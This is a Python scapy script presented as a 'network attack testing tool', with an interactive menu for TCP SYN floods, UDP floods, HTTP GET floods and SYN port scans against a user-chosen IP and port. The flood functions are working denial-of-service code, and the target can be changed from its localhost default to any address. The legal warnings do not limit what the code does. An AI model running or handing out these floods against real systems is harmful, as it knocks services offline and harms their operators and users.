"""
Real Network Attack Testing Tool
⚠️ WARNING: Use ONLY on authorized networks for educational purposes!
"""

from scapy.all import *
import threading
import time
from datetime import datetime
import random

# ============================================
# Configuration
# ============================================

# ⚠️ CHANGE THESE TO YOUR LOCAL NETWORK!
TARGET_IP = "127.0.0.1"  # Localhost for safe testing
TARGET_PORT = 80
SOURCE_PORT = random.randint(1024, 65535)

# Attack parameters
ATTACK_DURATION = 10  # seconds
PACKET_DELAY = 0.01   # seconds between packets

# ============================================
# Attack Functions
# ============================================

class RealAttackTester:
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.packets_sent = 0
        
    def tcp_syn_flood(self, duration=10):
        """
        TCP SYN Flood Attack (DDoS type)
        Sends massive SYN packets without completing handshake
        """
        print(f"\n{'='*70}")
        print("🚨 TCP SYN FLOOD ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Starting attack...\n")
        
        self.running = True
        self.packets_sent = 0
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration and self.running:
                # Create random source port
                sport = random.randint(1024, 65535)
                
                # Create SYN packet
                ip = IP(dst=self.target_ip)
                tcp = TCP(sport=sport, dport=self.target_port, flags="S")
                packet = ip/tcp
                
                # Send packet
                send(packet, verbose=0)
                self.packets_sent += 1
                
                # Progress display
                if self.packets_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = self.packets_sent / elapsed
                    print(f"[{elapsed:.1f}s] Sent: {self.packets_sent} packets | Rate: {rate:.0f} pkt/s")
                
                time.sleep(PACKET_DELAY)
        
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted by user")
        
        finally:
            self.running = False
            elapsed = time.time() - start_time
            print(f"\n{'='*70}")
            print("✅ Attack completed")
            print(f"{'='*70}")
            print(f"Total packets sent: {self.packets_sent}")
            print(f"Duration: {elapsed:.2f} seconds")
            print(f"Average rate: {self.packets_sent/elapsed:.2f} packets/sec\n")
    
    def port_scan(self, port_range=(20, 1024)):
        """
        Port Scanning Attack
        Scans range of ports on target
        """
        print(f"\n{'='*70}")
        print("🔍 PORT SCAN ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}")
        print(f"Port range: {port_range[0]}-{port_range[1]}")
        print(f"Starting scan...\n")
        
        open_ports = []
        start_time = time.time()
        
        try:
            for port in range(port_range[0], port_range[1] + 1):
                # Create SYN packet
                ip = IP(dst=self.target_ip)
                tcp = TCP(sport=SOURCE_PORT, dport=port, flags="S")
                packet = ip/tcp
                
                # Send and receive response
                response = sr1(packet, timeout=0.5, verbose=0)
                
                if response is not None:
                    if response.haslayer(TCP):
                        if response[TCP].flags == "SA":  # SYN-ACK = open
                            open_ports.append(port)
                            print(f"✅ Port {port}: OPEN")
                        elif response[TCP].flags == "RA":  # RST-ACK = closed
                            pass
                
                # Progress
                if port % 50 == 0:
                    progress = ((port - port_range[0]) / (port_range[1] - port_range[0])) * 100
                    print(f"Progress: {progress:.1f}%")
        
        except KeyboardInterrupt:
            print("\n⚠️  Scan interrupted by user")
        
        finally:
            elapsed = time.time() - start_time
            print(f"\n{'='*70}")
            print("✅ Scan completed")
            print(f"{'='*70}")
            print(f"Ports scanned: {port_range[1] - port_range[0] + 1}")
            print(f"Open ports found: {len(open_ports)}")
            if open_ports:
                print(f"Open ports: {', '.join(map(str, open_ports))}")
            print(f"Duration: {elapsed:.2f} seconds\n")
    
    def udp_flood(self, duration=10):
        """
        UDP Flood Attack
        Sends random UDP packets to target
        """
        print(f"\n{'='*70}")
        print("💥 UDP FLOOD ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Starting attack...\n")
        
        self.running = True
        self.packets_sent = 0
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration and self.running:
                # Create random payload
                payload = random._urandom(1024)  # 1KB random data
                
                # Create UDP packet
                ip = IP(dst=self.target_ip)
                udp = UDP(sport=random.randint(1024, 65535), dport=self.target_port)
                packet = ip/udp/payload
                
                # Send packet
                send(packet, verbose=0)
                self.packets_sent += 1
                
                # Progress
                if self.packets_sent % 50 == 0:
                    elapsed = time.time() - start_time
                    rate = self.packets_sent / elapsed
                    print(f"[{elapsed:.1f}s] Sent: {self.packets_sent} packets | Rate: {rate:.0f} pkt/s")
                
                time.sleep(PACKET_DELAY)
        
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted by user")
        
        finally:
            self.running = False
            elapsed = time.time() - start_time
            print(f"\n{'='*70}")
            print("✅ Attack completed")
            print(f"{'='*70}")
            print(f"Total packets sent: {self.packets_sent}")
            print(f"Duration: {elapsed:.2f} seconds\n")
    
    def http_flood(self, duration=10):
        """
        HTTP GET Flood Attack
        Sends massive HTTP GET requests
        """
        print(f"\n{'='*70}")
        print("🌐 HTTP GET FLOOD ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Starting attack...\n")
        
        self.running = True
        self.packets_sent = 0
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration and self.running:
                # Create HTTP GET request
                http_request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
                
                # Create packet
                ip = IP(dst=self.target_ip)
                tcp = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="PA")
                packet = ip/tcp/http_request
                
                # Send packet
                send(packet, verbose=0)
                self.packets_sent += 1
                
                # Progress
                if self.packets_sent % 50 == 0:
                    elapsed = time.time() - start_time
                    rate = self.packets_sent / elapsed
                    print(f"[{elapsed:.1f}s] Sent: {self.packets_sent} requests | Rate: {rate:.0f} req/s")
                
                time.sleep(PACKET_DELAY)
        
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted by user")
        
        finally:
            self.running = False
            elapsed = time.time() - start_time
            print(f"\n{'='*70}")
            print("✅ Attack completed")
            print(f"{'='*70}")
            print(f"Total requests sent: {self.packets_sent}")
            print(f"Duration: {elapsed:.2f} seconds\n")

# ============================================
# Menu Interface
# ============================================

def show_menu():
    print("\n" + "="*70)
    print("⚔️  REAL ATTACK TESTING TOOL")
    print("="*70)
    print("\n⚠️  WARNING: Use only on authorized networks!")
    print("\nSelect Attack Type:")
    print("\n1. TCP SYN Flood (DDoS)")
    print("2. Port Scan")
    print("3. UDP Flood")
    print("4. HTTP GET Flood")
    print("5. Configure Target")
    print("6. Exit")
    print("\n" + "="*70)

def configure_target():
    global TARGET_IP, TARGET_PORT
    
    print("\n" + "="*70)
    print("⚙️  TARGET CONFIGURATION")
    print("="*70)
    
    print(f"\nCurrent target: {TARGET_IP}:{TARGET_PORT}")
    print("\n💡 For safe testing, use:")
    print("   • 127.0.0.1 (localhost)")
    print("   • Your own VM/Docker container")
    print("   • Authorized test environment")
    
    new_ip = input("\nEnter target IP (or press Enter to keep current): ").strip()
    if new_ip:
        TARGET_IP = new_ip
    
    new_port = input("Enter target port (or press Enter to keep current): ").strip()
    if new_port:
        try:
            TARGET_PORT = int(new_port)
        except ValueError:
            print("❌ Invalid port number!")
    
    print(f"\n✅ Target set to: {TARGET_IP}:{TARGET_PORT}")

def main():
    print("\n" + "="*70)
    print("🚀 REAL NETWORK ATTACK TESTING TOOL")
    print("="*70)
    print("\n⚠️  LEGAL WARNING:")
    print("   • Use ONLY on networks you own or have permission to test")
    print("   • Unauthorized access is ILLEGAL")
    print("   • For EDUCATIONAL purposes only")
    print("\n✅ By continuing, you agree to use this tool responsibly.")
    
    response = input("\nDo you agree? (yes/no): ").strip().lower()
    if response != 'yes':
        print("\n❌ Exiting...")
        return
    
    tester = RealAttackTester(TARGET_IP, TARGET_PORT)
    
    while True:
        show_menu()
        choice = input("\nSelect option (1-6): ").strip()
        
        if choice == '1':
            duration = int(input("Attack duration (seconds, default 10): ") or 10)
            tester.tcp_syn_flood(duration=duration)
        
        elif choice == '2':
            start = int(input("Start port (default 20): ") or 20)
            end = int(input("End port (default 1024): ") or 1024)
            tester.port_scan(port_range=(start, end))
        
        elif choice == '3':
            duration = int(input("Attack duration (seconds, default 10): ") or 10)
            tester.udp_flood(duration=duration)
        
        elif choice == '4':
            duration = int(input("Attack duration (seconds, default 10): ") or 10)
            tester.http_flood(duration=duration)
        
        elif choice == '5':
            configure_target()
        
        elif choice == '6':
            print("\n👋 Exiting tool...")
            break
        
        else:
            print("❌ Invalid option!")
        
        input("\nPress Enter to continue...")

# ============================================
# Run
# ============================================

if __name__ == "__main__":
    # Check if running as admin/root (required for raw packets)
    try:
        if os.geteuid() != 0:
            print("\n⚠️  WARNING: This tool requires administrator/root privileges!")
            print("Please run with: sudo python3 real_attack_tool.py\n")
            exit(1)
    except AttributeError:
        # Windows doesn't have geteuid
        pass
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Tool interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()